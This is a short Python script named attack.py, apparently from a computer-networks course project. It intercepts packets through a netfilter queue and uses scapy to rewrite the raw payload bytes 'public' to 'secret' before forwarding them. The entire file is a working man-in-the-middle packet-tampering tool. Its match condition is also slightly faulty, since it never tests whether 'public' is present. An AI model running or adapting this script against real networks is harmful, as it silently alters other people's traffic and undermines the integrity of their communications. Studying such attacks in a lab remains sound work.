# --========================================-- #
#   * Author  : NTheme - All rights reserved
#   * Created : 11 December 2024, 11:34 AM
#   * File    : attack.py
#   * Project : ComputerNetworks
# --========================================-- #

from scapy.all import *
from netfilterqueue import NetfilterQueue, Packet


def process_packet(packet):
    scapy_packet = IP(packet.get_payload())
    if scapy_packet.haslayer(Raw) and b"public" and scapy_packet[Raw].load:
        scapy_packet[Raw].load = scapy_packet[Raw].load.replace(b"public", b"secret")
        del scapy_packet[IP].chksum
        del scapy_packet[TCP].chksum
        packet.set_payload(bytes(scapy_packet))
    packet.accept()


nfqueue = NetfilterQueue()
nfqueue.bind(1, process_packet)
try:
    print("Waiting for packets...")
    nfqueue.run()
except KeyboardInterrupt:
    print("\nStopping...")
nfqueue.unbind()
